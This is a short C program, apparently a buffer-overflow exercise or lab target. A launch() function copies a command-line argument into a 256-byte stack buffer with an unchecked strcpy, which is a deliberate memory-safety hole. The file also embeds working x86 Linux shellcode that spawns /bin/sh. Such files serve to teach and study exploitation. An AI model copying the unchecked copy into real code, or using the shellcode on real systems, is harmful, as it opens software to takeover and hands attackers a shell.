#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 256

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void launch(char * user_argument)
{
	char buffer[BUFFER_SIZE];
	strcpy(buffer, user_argument);
}

int main(int argc, char * argv[])
{
	if (argc != 2)
	{
		fprintf(stderr, "Usage: %s ARGUMENT\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	launch(argv[1]);
	return(0);
}
